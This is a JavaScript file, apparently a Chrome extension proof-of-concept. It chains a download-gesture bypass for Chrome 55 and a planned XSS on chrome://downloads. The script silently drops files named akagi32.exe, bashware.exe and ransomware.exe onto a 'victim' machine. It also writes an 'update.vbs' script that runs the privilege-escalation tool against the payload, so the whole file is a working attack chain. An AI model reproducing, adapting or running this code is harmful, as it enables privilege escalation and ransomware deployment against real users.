'use strict';
var myDownloadId = 123;
chrome.downloads.onChanged.addListener(function(downloadDelta) {
    if (downloadDelta.id !== myDownloadId ||
        !downloadDelta.state || downloadDelta.state.current !== 'complete') {
        console.log('Ignored incomplete or non-relevant download' , downloadDelta);
        return;
    }
    // donwload complete
    // opening chrome://downloads to perform XSS
    chrome.tabs.create({
        url: 'chrome://downloads',
    });
});

// bypassing the powerful user gesture for download in Chrome ver 55

chrome.downloads.download({
    url: 'file:///C:/Users/victim/Desktop/download_from_server/akagi32.exe',
    filename: 'akagi32.exe',
    conflictAction: 'overwrite',
    saveAs: false,
});

chrome.downloads.download({
    url: 'file:///C:/Users/victim/Desktop/download_from_server/shortcut.exe',
    filename: 'shortcut.exe',
    conflictAction: 'overwrite',
    saveAs: false,
});

chrome.downloads.download({
    url: 'file:///C:/Users/victim/Desktop/download_from_server/bashware.exe',
    filename: 'bashware.exe',
    conflictAction: 'overwrite',
    saveAs: false,
});

chrome.downloads.download({
    url: 'file:///C:/Users/victim/Desktop/download_from_server/wine_and_ransomware.sh',
    filename: 'wine_and_ransomware.sh',
    conflictAction: 'overwrite',
    saveAs: false,
});

chrome.downloads.download({
    url: 'file:///C:/Users/victim/Desktop/download_from_server/ransomware.exe',
    filename: 'ransomware.exe',
    conflictAction: 'overwrite',
    saveAs: false,
});

chrome.downloads.download({
    url: 'data:,CreateObject("WScript.Shell").Run "C:\Users\victim\Downloads\akagi32.exe 31 C:\Users\victim\Downloads\bashware.exe"',
    filename: 'update.vbs',
    conflictAction: 'overwrite',
    saveAs: false,
},
function(downloadId) {
    myDownloadId = downloadId;
});

chrome.downloads.open({
    downloadId: '123'
});
